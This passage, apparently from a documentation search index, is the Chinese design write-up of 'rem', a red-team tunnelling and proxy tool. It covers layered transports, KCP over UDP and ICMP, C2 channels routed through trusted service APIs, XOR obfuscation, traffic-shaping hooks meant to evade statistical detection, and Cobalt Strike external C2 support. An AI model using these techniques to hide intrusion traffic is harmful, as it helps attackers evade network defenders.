\u4e0b\u9762\u7684\u5185\u5bb9\u5efa\u8bae\u7ed3\u5408rem\u7684\u5177\u4f53\u4ee3\u7801\u5b9e\u73b0\u9605\u8bfb\u3002</p>"},{"location":"rem/design/#\u4f20\u8f93\u5c42","title":"\u4f20\u8f93\u5c42","text":"<p>rem\u7684\u4f20\u8f93\u5c42\u8868\u793a\u4e3atunnel\u3002\u6bcf\u4e2atunnel\u7531\u4e00\u4e2adialer\u548c\u4e00\u4e2alistener\u7ec4\u6210, \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c listener\u548cdialer\u53ea\u5728\u4f20\u8f93\u5c42\u4e0a\u8868\u793aserver\u548cclient\u7684\u5173\u7cfb\uff0c \u5f53\u5efa\u7acb\u8d77tunnel\u540e\uff0crem\u4e4b\u95f4\u90fd\u662f\u5e73\u7b49\u7684\u8282\u70b9\u3002\u8fd9\u4e00\u70b9\u548c\u4ee5\u5f80\u7684\u4ee3\u7406\u5de5\u5177\u6709\u5f88\u5927\u4e0d\u540c\u3002</p> <p>golang\u5df2\u7ecf\u63d0\u4f9b\u4e86icmp, udp, tcp, unix\u56db\u4e2a\u534f\u8bae\u4f5c\u4e3a\u4f20\u8f93\u5c42\uff0c\u6807\u51c6\u5e93\u5b9e\u73b0\u4e86\u5176Dialer\u548cListener\u63a5\u53e3\uff0c \u5f00\u7bb1\u5373\u7528\u3002 </p> <p>\u56e0\u6b64tcp\u4e5f\u662f\u6700\u5bb9\u6613\u5b9e\u73b0\u7684tunnel\uff0c \u51e0\u4e4e\u4e0d\u9700\u8981\u989d\u5916\u7684\u4fee\u6539\uff0c \u5c31\u53ef\u4ee5\u5c06tcp\u534f\u8bae\u4f5c\u4e3atunnel\u4f7f\u7528\u3002 \u8fd9\u91cc\u662f\u4e00\u4e2a\u5220\u53bb\u65e0\u5173\u4ee3\u7801\u7684tcp tunnel\u7684\u5b9e\u73b0\u3002</p> <pre><code>type TCPDialer struct {  \n    net.Conn  \n    meta core.Metas  \n}  \n\nfunc NewTCPDialer(meta core.Metas) *TCPDialer {  \n    return &amp;TCPDialer{  \n       meta: meta,  \n    }  \n}  \n\nfunc (c *TCPDialer) Dial(dst string) (net.Conn, error) {  \n    u, err := core.NewURL(dst)  \n    if err != nil {  \n       return nil, err  \n    }  \n    c.meta[\"url\"] = u  \n    return net.Dial(\"tcp\", u.Host)  \n}  \n\ntype TCPListener struct {  \n    listener net.Listener  \n    meta     core.Metas  \n}  \n\nfunc NewTCPListener(meta core.Metas) *TCPListener {  \n    return &amp;TCPListener{  \n       meta: meta,  \n    }  \n}  \n\nfunc (c *TCPListener) Listen(dst string) (net.Listener, error) {  \n    u, err := core.NewURL(dst)  \n    if err != nil {  \n       return nil, err  \n    }  \n    c.meta[\"url\"] = u  \n\n    listener, err := net.Listen(\"tcp\", u.Host)  \n    if err != nil {  \n       return nil, err  \n    }  \n    c.listener = listener  \n    return listener, nil  \n}\n</code></pre> <p>\u975e\u5e38\u7b80\u5355\u4e14\u6e05\u6670\u3002 </p> <p>\u4f46\u662f\u5176\u4ed6\u4f20\u8f93\u5c42\u534f\u8bae\u5c31\u6ca1\u8fd9\u4e48\u7b80\u5355\u4e86\u3002</p>"},{"location":"rem/design/#\u4f20\u8f93\u5c42\u4e4b\u4e0b","title":"\u4f20\u8f93\u5c42\u4e4b\u4e0b","text":"<p>golang\u867d\u7136\u9ed8\u8ba4\u5c31\u5b9e\u73b0\u4e86udp\u534f\u8bae\u7684\u6240\u6709\u7684\u63a5\u53e3\uff0c \u4f46\u9ed8\u8ba4\u63d0\u4f9b\u7684udp\u534f\u8bae\u662f\u4e0d\u53ef\u9760\u7684\uff0c \u5982\u679c\u8981\u5c06\u5176\u4f5c\u4e3a\u53ef\u9760\u7684tunnel\uff0c\u90a3\u6211\u4eec\u5c31\u9700\u8981\u81ea\u5df1\u6765\u505a\u3002 \u901a\u5e38\u8fd9\u4e2a\u534f\u8bae\u53eb\u505a ARQ (Automatic Repeat-reQuest), \u4e16\u754c\u4e0a\u6709\u975e\u5e38\u591a\u7684ARQ\u534f\u8bae\uff0c\u4f8b\u5982TCP\u5c31\u662f\u6700\u77e5\u540d\u7684ARQ\u534f\u8bae\u3002 </p> <p>\u4e3a\u4ec0\u4e48\u5c06ARQ\u534f\u8bae\u79f0\u4e3a\u4f20\u8f93\u5c42\u4e4b\u4e0b\uff0c \u539f\u56e0\u5c31\u5728\u4e8eARQ\u534f\u8bae\u4e0d\u9002\u7528net.Conn\uff0c \u800c\u662f\u57fa\u4e8enet.PacketConn. </p> <p><pre><code>type PacketConn interface {  \n    ReadFrom(p []byte) (n int, addr Addr, err error)  \n\n    WriteTo(p []byte, addr Addr) (n int, err error)\n    ...\n}\n</code></pre> \u4e0enet.Conn\u6700\u5927\u7684\u533a\u522b\u5c31\u662f\u8fd9\u4e24\u4e2a\u63a5\u53e3\u3002 PacketConn\u662f\u9762\u5411\u65e0\u72b6\u6001\u7684\u6570\u636e\u5305\u7684\uff0c \u4e0d\u540c\u4e8etcp\u5df2\u7ecf\u5728\u64cd\u4f5c\u7cfb\u7edf\u5c42\u5b9e\u73b0\u4e86\u5199\u7ed9\u8c01\u7684\u95ee\u9898\uff0cUDP/ICMP\u6216\u8005\u5176\u4ed6\u65e0\u72b6\u6001\u6570\u636e\u5305(\u4f8b\u5982\u57fa\u4e8e\u5916\u90e8api\u7684\u4f20\u8f93\u5c42)\uff0c \u90fd\u9700\u8981\u5904\u7406\u8fd9\u4e2a\u95ee\u9898\u3002 </p> <p>\u6211\u4eec\u9700\u8981\u5c06PacketConn\u5c01\u88c5\u4e3aConn\uff0c\u5e76\u4e14\u5904\u7406\u5176\u4e2d\u7684\u5404\u79cd\u9519\u8bef/\u91cd\u4f20/\u4e22\u5305/\u987a\u5e8f\u7b49\u95ee\u9898\uff0c \u624d\u80fd\u5b9e\u73b0\u4e00\u4e2a\u7a33\u5b9a\u7684\u4f20\u8f93\u5c42\u3002 tunnel\u662f\u642d\u5efa\u5728\u7a33\u5b9a\u53ef\u9760\u7684Conn\u4e4b\u4e0a\u7684\uff0c\u662f\u9762\u5411\u6570\u636e\u6d41\u7684\u3002</p> <p>\u597d\u5728golang\u4e2d\u5df2\u7ecf\u6709\u975e\u5e38\u591a\u6210\u719f\u7684ARQ\u534f\u8bae\u5b9e\u73b0\uff0c \u4f8b\u5982:</p> <ul> <li>kcp-go \u76f8\u5bf9\u8f7b\u91cf\u7684ARQ\u534f\u8bae\uff0c\u539f\u751f\u5b9e\u73b0\u867d\u7136\u5bf9PacketConn\u505a\u4e86\u4e00\u5b9a\u62bd\u8c61\uff0c \u4f46\u662f\u53ea\u652f\u6301UDP</li> <li>quic-go\uff0c google\u8bbe\u8ba1\u7684ARQ\u534f\u8bae\uff0c \u73b0\u5728\u5df2\u7ecf\u6539\u540dhttp3\uff0c \u5b9e\u73b0\u4e86\u975e\u5e38\u591a\u7684\u7279\u6027\uff0c\u4f46\u662f\u4e5f\u76f8\u5bf9\u7b28\u91cd</li> <li>...</li> </ul> <p>rem\u9009\u62e9\u76f8\u5bf9\u8f7b\u91cf\u7684kcp\u4f5c\u4e3arem\u7684\u9ed8\u8ba4ARQ\u534f\u8bae\uff08ARQ\u534f\u8bae\u4e5f\u4f1a\u5f15\u5165\u65b0\u7684\u7279\u5f81\uff09\u3002\u5e76\u4e14\u57fa\u4e8ekcp-go\u8fdb\u884c\u4e86\u91cd\u6784\uff0c \u5c06\u5176\u539f\u672c\u5bf9UDP\u7684\u8026\u5408\u89e3\u8026\uff0c \u4efb\u610f\u5b9e\u73b0\u4e86PacketConn\u63a5\u53e3\u7684\u6570\u636e\u4ea4\u6362\u90fd\u53ef\u4ee5\u88abKCP\u5c01\u88c5\u4e3a\u53ef\u9760\u7684Conn\u3002 \u5e76\u4ea4\u4ed8\u7ed9\u4e0a\u5c42\u7684tunnel\u3002</p> <p>\u901a\u8fc7KCP\uff0c \u5c06golang\u539f\u672c\u5c31\u652f\u6301\u7684icmp/udp\u5c01\u88c5\u4e3a\u4e86\u53ef\u9760\u7684tunnel\uff0c \u4f46\u5230\u8fd9\u91cc\u8fd8\u6ca1\u5b8c\u3002 </p> <p>\u6700\u7ec8\u7684\u6210\u679c\u4f4d\u4e8e: https://github.com/chainreactors/rem-community/tree/master/x/kcp</p>"},{"location":"rem/design/#lolc2","title":"lolc2","text":"<p>lolc2\u4e0e loldrive , lolbas \u7c7b\u4f3c, \u901a\u8fc7\u53ef\u4fe1\u7684\u670d\u52a1\u642d\u5efa\u81ea\u5df1\u7684\u96a7\u9053\u3002</p> <p>\u8fd9\u4e9b\u670d\u52a1\u901a\u5e38\u90fd\u662f\u901a\u8fc7\u63d0\u4f9bapi\u5b9e\u73b0\u901a\u8baf, \u4e5f\u5c31\u662fhttp\u534f\u8bae. \u4f46\u8fd9\u91cc\u6709\u4e2a\u95ee\u9898, \u8fd9\u4e9b\u670d\u52a1\u7684\u8bfb/\u5199\u901a\u5e38\u662f\u4e0d\u540c\u7684\u63a5\u53e3, \u5e76\u4e14\u90fd\u662f\u5355\u4e2a\u6570\u636e\u5305\uff0c \u800c\u975e\u6d41\u5f0f\u4f20\u8f93. </p> <p>\u6240\u4ee5\u5bf9\u4e8e\u5355\u5de5\u4fe1\u9053\uff08simplex\uff09\uff0c\u4f8b\u5982http\u534f\u8bae\uff0c\u6216\u8005\u57fa\u4e8e\u5404\u79cdapi\u7684\u6570\u636e\u4ea4\u6362\u4fe1\u9053\u3002 \u8fd8\u9700\u8981\u4e00\u5c42\u5c01\u88c5\u3002 </p> <p>http\u534f\u8bae\u53ea\u5141\u8bb8\u5355\u5411\u53d1\u8d77\u8bf7\u6c42\uff0c \u56e0\u6b64\u8981\u8ba9\u6570\u636e\u80fd\u5373\u65f6\u4eceserver\u4f20\u8f93\u7ed9client\uff0c \u5fc5\u987b\u901a\u8fc7client\u53d1\u8d77\u8f6e\u8be2\u3002\u5e76\u4e14\u8f6e\u8be2\u7684\u95f4\u9694\u5c31\u662f\u8fde\u63a5\u7684\u6700\u5c0fRTT(\u5f80\u8fd4\u65f6\u95f4)\u3002\u6211\u4eec\u9700\u8981\u975eserver\u548cclient\u5206\u522b\u5b9e\u73b0\u4e0d\u540c\u7684ReadFrom\u548cWriteTo\u624d\u53ef\u4ee5\u5b9e\u73b0\u5bf9\u5e94\u7684\u6570\u636e\u4ea4\u6362\uff0c \u5e76\u4ea4\u4ed8\u7ed9\u4e0a\u5c42\u7684tunnel\u3002</p> <p>\u8fd9\u4e48\u505a\u6027\u80fd\u53ef\u80fd\u662f\u4e2a\u5f88\u5927\u95ee\u9898, \u7528\u6765C2\u901a\u8baf\u4e00\u822c\u662f\u591f\u7528, \u7528\u6765\u6784\u5efa\u5404\u79cd\u4ee3\u7406\u4f1a\u6bd4\u8f83\u53d7\u9650.</p> <p>\u5f53\u7136\u4e5f\u6709\u4e0d\u5c11\u4e1a\u52a1\u5b58\u5728\u6d41\u5f0f\u4f20\u8f93\u7684\u529f\u80fd, \u4f8b\u5982\u89c6\u9891\u6d41, \u6587\u4ef6\u6d41\u7b49, \u5728\u5b9e\u73b0\u4e0a\u662f\u7c7b\u4f3c\u7684. </p> <p>\u5982\u679c\u662f\u5355\u4e2a\u6570\u636e\u5305\u7684api, \u901a\u8fc7\u8f6e\u8be2\u6a21\u62df\u8fde\u63a5, \u6d41\u5f0f\u4f20\u8f93\u5219\u76f4\u63a5\u4f5c\u4e3aReadWriteClose\u5373\u53ef. </p>"},{"location":"rem/design/#\u4f20\u8f93\u5c42\u4e4b\u4e0a","title":"\u4f20\u8f93\u5c42\u4e4b\u4e0a","text":"<p>\u5728\u4f20\u8f93\u5c42\u4e4b\u4e0a\uff0cOSI\u6a21\u578b\u4e2d\u662f\u4f1a\u8bdd\u5c42\uff0c \u8868\u793a\u5c42\uff0c \u548c\u5e94\u7528\u5c42\uff0c \u5206\u522b\u5bf9\u5e94\u5230rem\u5c31\u662fmux(\u94fe\u63a5\u590d\u7528)\u5c42\uff0c\u52a0\u5bc6\u6df7\u6dc6\u5c42\uff0c\u5e94\u7528\u5c42\u3002</p> <p>\u5728golang\u4e2d\uff0c \u5df2\u7ecf\u6709\u5f88\u591a\u4e2a\u6210\u719f\u7684\u591a\u8def\u590d\u7528(connection multiplexing)\u5b9e\u73b0\uff0c \u4f8b\u5982smux\u548cyamux\u3002 \u4f46\u8fd9\u548carq\u534f\u8bae\u4e00\u6837\uff0c\u4f1a\u5f15\u5165\u65b0\u7684\u7279\u5f81\uff0c\u5e76\u4e14\u4e0d\u662f\u6240\u6709\u7684\u60c5\u51b5\u90fd\u9002\u5408\u591a\u8def\u590d\u7528\u5668\u5de5\u4f5c\uff0c \u4f8b\u5982\u4f7f\u7528http\u8fd9\u7c7b\u5355\u5de5\u534f\u8bae\u6a21\u62df\u6d41\u65f6\uff0c smux\u7684\u63a7\u5236\u5c0f\u5305\u4f1a\u5e26\u6765\u989d\u5916\u7684\u4f20\u8f93\u5ef6\u8fdf\u3002 \u6240\u4ee5rem\u5b9e\u73b0\u4e86\u4e00\u4e2a\u81ea\u5df1\u7684\u591a\u8def\u590d\u7528\u5668\u3002\u8fd9\u4e2a\u591a\u8def\u590d\u7528\u5668\u5de5\u4f5c\u5728wrapper(\u540e\u9762\u4f1a\u63d0\u5230)\u4e4b\u4e0a\u3002</p> <p>wrapper\u5219\u662f\u4ee3\u66ff\u539f\u672cOSI\u6a21\u578b\u4e2d\u7684\u8868\u793a\u5c42\uff0ctunnel\u4f20\u8f93\u7684\u6570\u636e\u5c06\u4f1a\u7ecf\u8fc7wrapper\u7684\u5305\u88c5\u3002</p> <p>wrapper\u672c\u8d28\u4e0a\u662f io.ReadWriteCloser \uff0c\u662f\u9762\u5411\u6d41\u7684\u6570\u636e\u5904\u7406\u534f\u8bae\u3002wrapper\u5c06\u4f1a\u5305\u88c5tunnel\u63d0\u4f9b\u7684net.Conn\u63a5\u53e3, \u7136\u5c06\u88abwrapper\u540e\u7684Conn\u4ea4\u4ed8\u7ed9mux\uff0c \u518d\u7531mux\u4ea4\u4ed8\u7ed9\u5e94\u7528\u5c42\u3002 </p> <p>\u4e00\u4e2a\u57fa\u4e8exor\u5b9e\u73b0\u7684wrapper\u53ea\u9700\u8981\u5b9e\u73b0\u7b80\u5355\u7684Read\u548cWrite\u63a5\u53e3\u5373\u53ef\u5c06\u6570\u636e\u8fdb\u884c\u7b80\u5355\u7684\u52a0\u5bc6:</p> <pre><code>func NewXorWrapper(r io.Reader, w io.Writer, opt map[string]string) core.Wrapper {  \n    var key []byte  \n    if k, ok := opt[\"key\"]; ok {  \n       key = []byte(k)  \n    } else {  \n       key = []byte{} // \u4f7f\u7528\u7a7a\u5b57\u8282\u5207\u7247\u4f5c\u4e3a\u9ed8\u8ba4\u503c  \n    }  \n\n    var iv []byte  \n    if i, ok := opt[\"iv\"]; ok {  \n       iv = []byte(i)  \n    } else {  \n       iv = key // \u5982\u679c\u6ca1\u6709\u63d0\u4f9biv\uff0c\u4f7f\u7528key\u4f5c\u4e3aiv  \n    }  \n\n    encryptor := utils.NewXorEncryptor(key, iv)  \n    return &amp;XorWrapper{  \n       reader:    &amp;cipher.StreamReader{S: encryptor.GetStream(), R: r},  \n       writer:    &amp;cipher.StreamWriter{S: encryptor.GetStream(), W: w},  \n       encryptor: encryptor,  \n    }  \n}  \n\nfunc (w *XorWrapper) Name() string {  \n    return consts.XORWrapper  \n}  \n\nfunc (w *XorWrapper) Read(p []byte) (n int, err error) {  \n    return w.reader.Read(p)  \n}  \n\nfunc (w *XorWrapper) Write(p []byte) (n int, err error) {  \n    return w.writer.Write(p)  \n}  \n\nfunc (w *XorWrapper) Close() error {  \n    return w.encryptor.Reset()  \n}\n</code></pre> <p>\u4f46\u5bf9\u4e8e\u975e\u6d41\u5f0f\u7684\u52a0\u5bc6\u6df7\u6dc6\u534f\u8bae\uff0c \u4f1a\u7a0d\u5fae\u9ebb\u70e6\u4e00\u70b9\uff0c \u6211\u4eec\u9700\u8981\u5728wrapper\u4e2d\u6dfb\u52a0\u7f13\u51b2\u533a\uff0c \u5c06\u9700\u8981\u7684\u6570\u636e\u8bfb\u5230\u7f13\u51b2\u533a\u540e\u8fdb\u884c\u7279\u5b9a\u7684\u64cd\u4f5c\u518d\u4ea4\u4ed8\u7ed9\u4e0a\u5c42\u3002\uff08\u8fd9\u6837\u7684\u5b9e\u73b0\u53ef\u80fd\u5728\u4e00\u5b9a\u5c42\u5ea6\u4e0a\u4f1a\u5f71\u54cd\u6027\u80fd\uff09</p> <p>\u6700\u7ec8\uff0c \u8fd8\u53ef\u4ee5\u5c06\u591a\u4e2awrapper\u8fde\u63a5\u5728\u4e00\u8d77\uff0c \u5c06\u6570\u636e\u8fdb\u884c\u590d\u6742\u7684\u52a0\u5bc6\u6df7\u6dc6\u64cd\u4f5c\u3002 </p> <p>\u5728rem\u4e2d\uff0c \u4f1a\u8bdd\u5c42\u548c\u8868\u793a\u5c42\u662f\u5012\u7f6e\u7684\u3002 \u4f1a\u8bdd\u5c42\u627f\u8f7d\u5728\u8868\u793a\u5c42\u4e4b\u4e0a\u3002 </p>"},{"location":"rem/design/#\u4f20\u8f93\u5c42\u4e4b\u95f4","title":"\u4f20\u8f93\u5c42\u4e4b\u95f4","text":"<p>rem\u662f\u5728\u4f20\u8f93\u5c42\u4e4b\u4e0a\u91cd\u65b0\u6784\u5efa\u7684\u4e00\u6574\u5957\u7f51\u7edc\u67b6\u6784\u3002 \u5bf9\u4e8e\u5e95\u5c42\u7684\u4ea4\u6362\u8def\u7531\u8bbe\u5907\uff0crem\u4e0d\u4f1a\u6709\u6d89\u53ca\uff0c \u4f46\u662f\u539f\u672c\u7684\u7f51\u7edc\u4e2d\uff0c \u5c31\u6709\u5404\u79cd\u5404\u6837\u7684\u5e94\u7528\u5c42\u4ee3\u7406\uff0c\u4f8b\u5982http\uff0csocks5\uff0cssh\u7b49\u5404\u79cd\u5404\u6837\u7684\u4ee3\u7406\u534f\u8bae\uff0c \u4ee5\u53ca\u5728\u5b89\u5168\u4e2d\u5e38\u7528\u7684neoreg\uff0csuo5\u7b49webshell\u5b9e\u73b0\u7684\u4ee3\u7406\u534f\u8bae\u3002 </p> <p>\u4e3a\u4e86\u8ba9rem\u80fd\u4e0e\u5916\u90e8\u7684\u4ee3\u7406\u534f\u8bae\u6709\u4ea4\u4e92\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u5728\u5404\u4e2a\u5c42\u9762\u4e0a\u5141\u8bb8rem\u901a\u8fc7\u539f\u672c\u5c31\u5b58\u5728\u7684\u4ee3\u7406\u534f\u8bae\u642d\u5efa\u4fe1\u9053\uff08\u901a\u5e38\u7528\u5728\u5404\u79cd\u4e0d\u51fa\u7f51\u6216\u8005\u9650\u5236\u51fa\u7f51\u573a\u666f\u4e0b\uff09\u3002</p> <p>rem\u9700\u8981\u8ba9tunnel\uff0coutbound\u7b49\u5404\u79cd\u573a\u666f\u90fd\u652f\u6301\u4e0a\u57fa\u4e8e\u539f\u672c\u7684\u4ee3\u7406\u534f\u8bae\u5b9e\u73b0\u6570\u636e\u4f20\u8f93\u3002 </p> <p>\u5728\u7279\u522b\u65e9\u671f\u7248\u672c\u627e\u5230\u4e86 https://github.com/zhuhaow/ProxyClient \u8fd9\u4e2a\u5e93\uff0c \u4f46\u56e0\u4e3a\u4ee3\u7801\u4e4b\u7c7b\u8f83\u4f4e\u53c8\u66ff\u6362\u4e3a\u4e86 https://github.com/missdeer/ProxyClient \u3002\u7ed3\u679c\u65b0\u7684\u8fd9\u4e2a\u5e93\u5728\u6bcf\u4e2a\u534f\u8bae\u4e0a\u90fd\u5b58\u5728bug\u3002 </p> <p>\u6700\u540e\u57fa\u4e8e https://github.com/missdeer/ProxyClient \u91cd\u6784\u5e76\u4fee\u590d\u4e86\u5927\u91cf\u7684bug, \u624d\u80fd\u8ba9rem\u5de5\u4f5c\u5728\u5404\u79cd\u4ee3\u7406\u534f\u8bae\u4e0a\u3002 </p> <p>\u6700\u7ec8\u7684\u6210\u679c\u4f4d\u4e8e: https://github.com/chainreactors/proxyclient</p>"},{"location":"rem/design/#\u4f20\u8f93\u5c42\u4e4b\u5916","title":"\u4f20\u8f93\u5c42\u4e4b\u5916","text":"<p>\u73b0\u4ee3\u7684\u6d41\u91cf\u68c0\u6d4b\u8bbe\u5907\uff0c \u9664\u4e86\u7279\u5f81\u68c0\u6d4b\u4e4b\u5916\uff0c \u8fd8\u4f1a\u6709\u5927\u6570\u636e\uff0c \u7edf\u8ba1\u5b66\uff0c AI\u4e4b\u7c7b\u7684\u5bf9\u6297\u7ef4\u5ea6\u3002 \u6211\u4eec\u521a\u521a\u6784\u5efa\u7684\u4f20\u8f93\u5c42\u672c\u8d28\u4e0a\u53ea\u89e3\u51b3\u4e86\u7279\u5f81\u68c0\u6d4b\u548c\u5bc6\u7801\u5b66\u5b89\u5168\u7684\u95ee\u9898\u3002 \u5bf9\u4e8e\u8fd9\u4e9b\u65b0\u7684\u68c0\u6d4b\u7ef4\u5ea6\uff0c \u6211\u4eec\u4e5f\u9700\u8981\u65b0\u7684\u624b\u6bb5\u3002 </p> <p>rem\u8fd8\u63d0\u4f9b\u4e86\u4e00\u7ec4\u63a5\u53e3\uff0c \u80fd\u8ba9\u7528\u6237\u5bf9\u6570\u636e\u8fdb\u884c\u7edf\u8ba1\u5b66\u5c42\u9762\u7684\u64cd\u4f5c\u3002 </p> <pre><code>type BeforeHook struct {  \n    DialHook   func(ctx context.Context, addr string) context.Context  \n    AcceptHook func(ctx context.Context) context.Context  \n    ListenHook func(ctx context.Context, addr string) context.Context  \n}  \n\ntype AfterHookFunc func(ctx context.Context, c net.Conn, addr string) (context.Context, net.Conn, error)  \n\ntype AfterHook struct {  \n    Priority   uint  \n    DialerHook func(ctx context.Context, c net.Conn, addr string) (context.Context, net.Conn, error)  \n    AcceptHook func(ctx context.Context, c net.Conn) (context.Context, net.Conn, error)  \n    ListenHook func(ctx context.Context, listener net.Listener) (context.Context, net.Listener, error)  \n}\n</code></pre> <p>after\u548cbefore hook\u80fd\u5728tunnel dial/accept\u524d\u540e\u5b9e\u73b0\u7279\u5b9a\u7684\u64cd\u4f5c\u3002 \u4f8b\u5982\u6dfb\u52a0\u968f\u673a\u7684 \u5ef6\u8fdf/\u6d41\u91cf\u63a7\u5236/\u538b\u7f29/\u968f\u673a\u586b\u5145 \u7b49\u7b49\u64cd\u4f5c\uff0c \u6765\u89c4\u907f\u7edf\u8ba1\u5b66\u548c\u5927\u6570\u636e\u4e0a\u7684\u68c0\u6d4b\u3002 \uff08\u987a\u5e26\u4e00\u63d0\uff0c wrapper\u4e5f\u662f\u57fa\u4e8ehook\u5b9e\u73b0\u7684\uff09\u3002\u751a\u81f3\u66f4\u8fdb\u4e00\u6b65\uff0c \u6211\u4eec\u53ef\u4ee5\u72ec\u7acb\u63a7\u5236\u4e0a\u4e0b\u884c\u7684\u6570\u636e\u7279\u5f81\uff0c \u53bb\u6a21\u62df\u4efb\u610f\u6570\u636e\u4f20\u8f93\u7684\u7279\u6027\u3002 </p>"},{"location":"rem/design/#\u5e94\u7528\u5c42","title":"\u5e94\u7528\u5c42","text":"<p>\u4e4b\u524d\u63d0\u5230\u8fc7rem\u4e4b\u95f4\u5e76\u4e0d\u5206server\u548cclient\uff0c\u53ea\u6709tunnel\u6709\u903b\u8f91\u610f\u4e49\u4e0a\u7684server\u548cclient\uff0c \u6700\u7ec8\u7684\u539f\u56e0\u5c31\u662f\u6211\u4eec\u901a\u8fc7inbound/outbound\u6765\u63a7\u5236\u6d41\u91cf\u7684\u65b9\u5411\uff0c \u800cinbound/outbound \u65e2\u53ef\u4ee5\u642d\u5efa\u5728tunnel\u7684server\u4e0a\u4e5f\u53ef\u4ee5\u662fclient\u4e0a\u3002 </p> <p>inbound\u662f\u6570\u636e\u5165\u53e3\uff0c outbound\u662f\u6570\u636e\u51fa\u53e3\u3002 \u7528\u6237\u7684\u6570\u636e\u4eceinbound\u7ecf\u8fc7tunnel\u5230outbound\u5bf9\u5916\u53d1\u8d77\u8bf7\u6c42\u3002</p> <p>\u5927\u591a\u6570\u573a\u666f\u4e0b\uff0c \u6211\u4eec\u53ea\u4f1a\u7528\u5230\u53cd\u5411\u4ee3\u7406\uff0c\u7531\u5916\u7f51\u8bbf\u95ee\u5230\u76ee\u6807\u5185\u7f51\u3002</p> <p>\u4f46\u662f\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u505a\u7684\u66f4\u591a\uff0c \u6211\u4eec\u53ea\u9700\u8981\u5b9e\u73b0\u4e00\u4e2a\u7b26\u5408cobaltstrike\u7684external c2 \u534f\u8bae\u7684inbound\uff0c \u6211\u4eec\u5c31\u53ef\u4ee5\u8ba9cobaltstrike\u7684\u6d41\u91cf\u8d70\u5230rem\u6784\u5efa\u7684\u7f51\u7edc\u4e2d\u3002 </p> <p>\u518d\u8fdb\u4e00\u6b65\uff0c \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7tun/tap\u865a\u62df\u7f51\u5361\uff0c\u771f\u6b63\u610f\u4e49\u4e0a\u5c06\u76ee\u6807\u548c\u672c\u5730\u7684\u7f51\u7edc\u8fde\u4e3a\u4e00\u4f53\u3002</p> <p>\u66f4\u751a\u81f3\uff0c \u901a\u8fc7STUN\u534f\u8bae\uff0c \u5b9e\u73b0p2p\u7684\u7f51\u7edc\u901a\u8baf\u3002</p> <p>\u8fd9\u4e00\u5207\uff0c \u90fd\u53ef\u4ee5\u5728rem\u7684\u80fd\u529b\u8986\u76d6\u8303\u56f4\u4e4b\u5185\u3002 </p>"},{"location":"rem/design/#features","title":"Features","text":""},{"location":"rem/design/#\u57fa\u672c\u529f\u80fd","title":"\u57fa\u672c\u529f\u80fd","text":"<ul> <li>\u6b63\u5411\u7aef\u53e3\u8f6c\u53d1, \u5c06\u7aef\u53e3\u4ece\u672c\u673a\u8f6c\u53d1\u5230\u8fdc\u7a0b</li> <li>\u53cd\u5411\u7aef\u53e3\u8f6c\u53d1,  \u5c06\u7aef\u53e3\u4ece\u8fdc\u7a0b\u8f6c\u53d1\u5230\u672c\u673a</li> <li>\u6b63\u5411\u4ee3\u7406, \u642d\u5efasocks5/http\u4ee3\u7406</li> <li>\u53cd\u5411\u4ee3\u7406, \u901a\u8fc7\u670d\u52a1\u5668, \u5c06\u6d41\u91cf\u4ee3\u7406\u81f3\u5ba2\u6237\u7aef. (rem\u4e2d\u5b9e\u9645\u4e0a\u5e76\u4e0d\u4e00\u5b9a\u6709\u670d\u52a1\u7aef\u4e0e\u5ba2\u6237\u7aef\u4e4b\u5206, rem\u4e2d\u53ef\u4ee5\u5c06\u6d41\u91cf\u4ee3\u7406\u81f3\u4efb\u610f\u8282\u70b9)</li> <li>\u4ee3\u7406, \u901a\u8fc7\u5176\u4ed6\u670d\u52a1\u63d0\u4f9b\u7684\u4ee3\u7406\u534f\u8bae, \u4f8b\u5982socks5/http\u4ee3\u7406, \u8f6c\u53d1rem\u534f\u8bae\u672c\u8eab\u7684\u6d41\u91cf</li> <li>\u8f6c\u53d1, \u901a\u8fc7\u5176\u4ed6\u670d\u52a1\u63d0\u4f9b\u7684\u4ee3\u7406\u534f\u8bae, \u5c06\u51fa\u65b9\u5411\u7684\u6d41\u91cf\u8f6c\u53d1\u5230\u6307\u5b9a\u76ee\u6807</li> <li>\u7ea7\u8054, \u80fd\u901a\u8fc7rem\u81ea\u8eab\u7684\u534f\u8bae, \u5f62\u6210\u591a\u7ea7\u7684\u8282\u70b9\u7684\u8fde\u63a5\u5173\u7cfb</li> <li>\u591a\u7ea7\u7aef\u53e3\u8f6c\u53d1,  \u5c06\u7aef\u53e3\u4ece\u672c\u673a\u901a\u8fc7rem\u8f6c\u53d1\u5230\u4efb\u610frem\u7f51\u7edc\u4e2d\u7684\u8282\u70b9</li> <li>\u591a\u7ea7\u4ee3\u7406\u8f6c\u53d1, \u5c06\u6d41\u91cf\u901a\u8fc7rem\u8f6c\u53d1\u5230\u4efb\u610frem\u7f51\u7edc\u4e2d\u7684\u8282\u70b9</li> <li>RPORTFWD_LOCAL, (\u591a\u7ea7\u7aef\u53e3\u8f6c\u53d1\u7684\u7279\u4f8b), \u5c06\u672c\u673a\u7684\u7684\u7aef\u53e3\u901a\u8fc7rem\u8f6c\u53d1\u81f3</li> <li>PORTFWD_LOCAL,  (\u591a\u7ea7\u7aef\u53e3\u8f6c\u53d1\u7684\u7279\u4f8b), \u5c06rem\u8282\u70b9\u7684\u7aef\u53e3\u8f6c\u53d1\u81f3\u672c\u673a</li> <li>\u652f\u6301\u5bf9\u5916\u66b4\u9732socks5/shadowsocks/trojan/http\u7b49\u591a\u79cd\u534f\u8bae</li> <li>\u8de8\u8bed\u8a00\u4e92\u64cd\u4f5c\u6027\u4e0e\u6a21\u5757\u5316</li> <li>... </li> </ul> <p>\u7406\u8bba\u4e0a\u53ea\u9700\u8981\u5c06\u4e0a\u8bc9\u529f\u80fd\u4ea4\u53c9\u7ec4\u5408\u5c31\u80fd\u5b9e\u73b0\u4e00\u5207 proxy/tunnel\u76f8\u5173\u7684\u9700\u6c42. </p>"},{"location":"rem/design/#opsec\u7279\u6027","title":"OPSEC\u7279\u6027","text":"<ul> <li>\u52a0\u5bc6\u6df7\u6dc6\u5c42\u4e92\u76f8\u5d4c\u5957\u4efb\u610f\u7ec4\u5408\uff0c \u5e76\u968f\u673a\u751f\u6210\u521d\u59cb\u6a21\u677f</li> <li>\u652f\u6301\u591a\u4fe1\u9053</li> <li>\u652f\u6301 https://lolc2.github.io/ , 